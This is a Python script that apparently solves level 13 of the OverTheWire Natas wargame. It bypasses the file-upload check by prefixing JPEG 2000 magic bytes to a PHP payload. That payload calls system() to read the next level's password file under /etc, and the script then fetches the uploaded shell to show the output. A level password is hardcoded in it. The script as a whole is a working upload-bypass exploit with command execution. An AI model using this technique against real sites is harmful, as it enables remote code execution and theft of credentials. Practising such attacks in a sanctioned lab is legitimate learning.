import re
import requests

from requests.auth import HTTPBasicAuth

HOST = 'http://natas13.natas.labs.overthewire.org/'
jp2_header = [0x00, 0x00, 0x00, 0x0c, 0x6a, 0x50, 0x20, 0x20, 0x0d, 0x0a, 0x87, 0x0a]
jp2_header = ''.join([chr(i) for i in jp2_header])
php_payload = r'''<?php
    echo "OK google\n";
    system("cat /etc/natas_webpass/natas14");
    echo "OK google\n";
?>'''

files = {'uploadedfile': ('file.php', jp2_header + php_payload)}
data = dict(filename='file.php')
auth = HTTPBasicAuth('natas13', 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY')

r = requests.post(HOST, auth=auth, files=files, data=data)
try:
    uploaded_file = re.findall('''(upload/\S{10}.php)''', r.content)[0]
    print 'Uploaded file: ', uploaded_file
    r = requests.get(HOST + uploaded_file, auth=auth)
except IndexError as ie:
    pass

print r.content
